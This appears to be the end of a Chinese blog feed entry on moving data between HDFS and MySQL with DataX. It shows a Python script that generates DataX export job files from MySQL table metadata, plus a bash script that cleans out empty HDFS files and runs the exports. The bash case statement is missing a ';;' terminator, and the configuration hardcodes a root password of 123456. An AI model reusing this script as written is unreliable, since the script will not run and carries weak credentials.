class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> getopt</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> MySQLdb</span><br><span class="line"></span><br><span class="line"><span class="comment">#MySQL相关配置，需根据实际情况作出修改</span></span><br><span class="line">mysql_host = <span class="string">"hadoop102"</span></span><br><span class="line">mysql_port = <span class="string">"3306"</span></span><br><span class="line">mysql_user = <span class="string">"root"</span></span><br><span class="line">mysql_passwd = <span class="string">"123456"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#HDFS NameNode相关配置，需根据实际情况作出修改</span></span><br><span class="line">hdfs_nn_host = <span class="string">"hadoop102"</span></span><br><span class="line">hdfs_nn_port = <span class="string">"8020"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#生成配置文件的目标路径，可根据实际情况作出修改</span></span><br><span class="line">output_path = <span class="string">"/opt/module/datax/job/export"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_connection</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> MySQLdb.connect(host=mysql_host, port=int(mysql_port), user=mysql_user, passwd=mysql_passwd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mysql_meta</span><span class="params">(database, table)</span>:</span></span><br><span class="line">    connection = get_connection()</span><br><span class="line">    cursor = connection.cursor()</span><br><span class="line">    sql = <span class="string">"SELECT COLUMN_NAME,DATA_TYPE from information_schema.COLUMNS WHERE TABLE_SCHEMA=%s AND TABLE_NAME=%s ORDER BY ORDINAL_POSITION"</span></span><br><span class="line">    cursor.execute(sql, [database, table])</span><br><span class="line">    fetchall = cursor.fetchall()</span><br><span class="line">    cursor.close()</span><br><span class="line">    connection.close()</span><br><span class="line">    <span class="keyword">return</span> fetchall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mysql_columns</span><span class="params">(database, table)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> map(<span class="keyword">lambda</span> x: x[<span class="number">0</span>], get_mysql_meta(database, table))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_json</span><span class="params">(target_database, target_table)</span>:</span></span><br><span class="line">    job = &#123;</span><br><span class="line">        <span class="string">"job"</span>: &#123;</span><br><span class="line">            <span class="string">"setting"</span>: &#123;</span><br><span class="line">                <span class="string">"speed"</span>: &#123;</span><br><span class="line">                    <span class="string">"channel"</span>: <span class="number">3</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"errorLimit"</span>: &#123;</span><br><span class="line">                    <span class="string">"record"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="string">"percentage"</span>: <span class="number">0.02</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">"content"</span>: [&#123;</span><br><span class="line">                <span class="string">"reader"</span>: &#123;</span><br><span class="line">                    <span class="string">"name"</span>: <span class="string">"hdfsreader"</span>,</span><br><span class="line">                    <span class="string">"parameter"</span>: &#123;</span><br><span class="line">                        <span class="string">"path"</span>: <span class="string">"$&#123;exportdir&#125;"</span>,</span><br><span class="line">                        <span class="string">"defaultFS"</span>: <span class="string">"hdfs://"</span> + hdfs_nn_host + <span class="string">":"</span> + hdfs_nn_port,</span><br><span class="line">                        <span class="string">"column"</span>: [<span class="string">"*"</span>],</span><br><span class="line">                        <span class="string">"fileType"</span>: <span class="string">"text"</span>,</span><br><span class="line">                        <span class="string">"encoding"</span>: <span class="string">"UTF-8"</span>,</span><br><span class="line">                        <span class="string">"fieldDelimiter"</span>: <span class="string">"\t"</span>,</span><br><span class="line">                        <span class="string">"nullFormat"</span>: <span class="string">"\\N"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"writer"</span>: &#123;</span><br><span class="line">                    <span class="string">"name"</span>: <span class="string">"mysqlwriter"</span>,</span><br><span class="line">                    <span class="string">"parameter"</span>: &#123;</span><br><span class="line">                        <span class="string">"writeMode"</span>: <span class="string">"replace"</span>,</span><br><span class="line">                        <span class="string">"username"</span>: mysql_user,</span><br><span class="line">                        <span class="string">"password"</span>: mysql_passwd,</span><br><span class="line">                        <span class="string">"column"</span>: get_mysql_columns(target_database, target_table),</span><br><span class="line">                        <span class="string">"connection"</span>: [</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="string">"jdbcUrl"</span>:</span><br><span class="line">                                    <span class="string">"jdbc:mysql://"</span> + mysql_host + <span class="string">":"</span> + mysql_port + <span class="string">"/"</span> + target_database + <span class="string">"?useUnicode=true&amp;characterEncoding=utf-8"</span>,</span><br><span class="line">                                <span class="string">"table"</span>: [target_table]</span><br><span class="line">                            &#125;</span><br><span class="line">                        ]</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(output_path):</span><br><span class="line">        os.makedirs(output_path)</span><br><span class="line">    <span class="keyword">with</span> open(os.path.join(output_path, <span class="string">"."</span>.join([target_database, target_table, <span class="string">"json"</span>])), <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        json.dump(job, f)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(args)</span>:</span></span><br><span class="line">    target_database = <span class="string">""</span></span><br><span class="line">    target_table = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    options, arguments = getopt.getopt(args, <span class="string">'-d:-t:'</span>, [<span class="string">'targetdb='</span>, <span class="string">'targettbl='</span>])</span><br><span class="line">    <span class="keyword">for</span> opt_name, opt_value <span class="keyword">in</span> options:</span><br><span class="line">        <span class="keyword">if</span> opt_name <span class="keyword">in</span> (<span class="string">'-d'</span>, <span class="string">'--targetdb'</span>):</span><br><span class="line">            target_database = opt_value</span><br><span class="line">        <span class="keyword">if</span> opt_name <span class="keyword">in</span> (<span class="string">'-t'</span>, <span class="string">'--targettbl'</span>):</span><br><span class="line">            target_table = opt_value</span><br><span class="line"></span><br><span class="line">    generate_json(target_database, target_table)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main(sys.argv[<span class="number">1</span>:])</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 由于需要使用Python访问Mysql数据库，故需安装驱动</span></span><br><span class="line">sudo yum install -y MySQL-python</span><br><span class="line"><span class="comment"># 脚本使用说明</span></span><br><span class="line"><span class="comment"># 通过-d传入MySQL数据库名，-t传入MySQL表名，执行上述命令即可生成该表的DataX</span></span><br><span class="line">python gen_export_config.py -d database -t table</span><br><span class="line"><span class="comment"># 然后把上述的写到一个脚本文件里即可</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后编写每日的导出脚本，导入也同理</span></span><br><span class="line">vim hdfs_to_mysql.sh</span><br></pre></td></tr></table></figure><p>导出脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"></span><br><span class="line">DATAX_HOME=/opt/module/datax</span><br><span class="line"></span><br><span class="line"><span class="comment">#DataX导出路径不允许存在空文件，该函数作用为清理空文件</span></span><br><span class="line"><span class="function"><span class="title">handle_export_path</span></span>()&#123;</span><br><span class="line">  target_file=<span class="variable">$1</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> `hadoop fs -ls -R <span class="variable">$target_file</span> | awk <span class="string">'&#123;print $8&#125;'</span>`; <span class="keyword">do</span></span><br><span class="line">    hadoop fs -<span class="built_in">test</span> -z <span class="variable">$i</span></span><br><span class="line">    <span class="keyword">if</span> [[ $? -eq 0 ]]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">"<span class="variable">$i</span>文件大小为0，正在删除"</span></span><br><span class="line">      hadoop fs -rm -r -f <span class="variable">$i</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#数据导出</span></span><br><span class="line"><span class="function"><span class="title">export_data</span></span>() &#123;</span><br><span class="line">  datax_config=<span class="variable">$1</span></span><br><span class="line">  export_dir=<span class="variable">$2</span></span><br><span class="line">  hadoop fs -<span class="built_in">test</span> -e <span class="variable">$export_dir</span></span><br><span class="line">  <span class="keyword">if</span> [[ $? -eq 0 ]]</span><br><span class="line">  <span class="keyword">then</span></span><br><span class="line">    handle_export_path <span class="variable">$export_dir</span></span><br><span class="line">    file_count=$(hadoop fs -ls <span class="variable">$export_dir</span> | wc -l)</span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$file_count</span> -gt 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">set</span> -e;</span><br><span class="line">      Python <span class="variable">$DATAX_HOME</span>/bin/datax.py -p<span class="string">"-Dexportdir=<span class="variable">$export_dir</span>"</span> <span class="variable">$datax_config</span></span><br><span class="line">      <span class="built_in">set</span> +e;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">      <span class="built_in">echo</span> <span class="string">"<span class="variable">$export_dir</span> 目录为空，跳过~"</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"路径 <span class="variable">$export_dir</span> 不存在，跳过~"</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里写上面生成的datax配置文件路径和hdfs的路径名</span></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">  <span class="string">"ads_new_buyer_stats"</span>)</span><br><span class="line">    export_data /opt/module/datax/job/<span class="built_in">export</span>/gmall_report.ads_new_buyer_stats.json /warehouse/gmall/ads/ads_new_buyer_stats</span><br><span class="line"><span class="string">"all"</span>)</span><br><span class="line">  export_data /opt/module/datax/job/<span class="built_in">export</span>/gmall_report.ads_new_buyer_stats.json /warehouse/gmall/ads/ads_new_buyer_stats</span><br><span class="line">  ;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1&gt;一、Sqoop安装与使用&lt;/h1&gt;
&lt;h2 id=&quot;1、简介&quot;&gt;1、简介&lt;/h2&gt;
&lt;p&gt;Sqoop全称是 &lt;strong&gt;Apache Sqoop&lt;/strong&gt;(现已经抛弃)，是一个开源工具，能够将数据从数据存储空间（数据仓库，系统文档存储空间，关系型数据库）导入 Hadoop 的 HDFS或列式数据库HBase，供 MapReduce 分析数据使用。数据传输的过程大部分是通过 MapReduce 过程来实现，只需要依赖数据库的Schema信息Sqoop所执行的操作是并行的，数据传输性能高，具备较好的容错性，并且能够自动转换数据类型。&lt;/p&gt;
&lt;p&gt;Sqoop是一个为高效传输海量数据而设计的工具，一般用在从关系型数据库同步数据到非关系型数据库中。Sqoop专门是为大数据集设计的。Sqoop支持增量更新，将新记录添加到最近一次的导出的数据源上，或者指定上次修改的时间戳。&lt;/p&gt;</summary>
    
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
</feed>
